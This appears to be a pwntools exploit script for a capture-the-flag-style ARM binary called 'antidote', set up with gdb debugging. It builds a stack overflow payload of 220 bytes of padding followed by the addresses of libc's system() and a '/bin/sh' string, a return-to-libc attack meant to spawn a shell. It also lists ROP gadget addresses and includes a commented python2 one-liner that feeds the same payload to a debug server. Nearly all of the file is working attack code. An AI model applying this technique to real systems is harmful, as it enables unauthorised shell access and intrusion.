from pwn import *
import time
# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
context.arch = 'arm'

# python2 -c 'print "A" * 220 + "\xcc\x34\xf0\xb6" + "B" * 4 + "\x2c\xbf\xfa\xb6"' | gdbserver --wrapper env 'LD_PRELOAD=./libc.so.6' -- :2000 ./antidote

#p = remote('192.168.0.19', 2000)
p = process('./antidote')
gdb.attach(p, '''
target remote 192.168.0.19:2000
break *main
break *main+104
''')

libc_system = p32(0xb6f034cc)
binsh = p32(0xb6fabf2c)
pop_r3 = p32(0xbefd83cc)
pop_r0_r1 = p32(0x0006b864)
0x00008f2d
0xb6f15f5b

payload = ""
payload += "A" * 220
payload += libc_system
payload += "JUNK"
payload += binsh


p.recv()
#p.sendline(payload)
p.interactive()
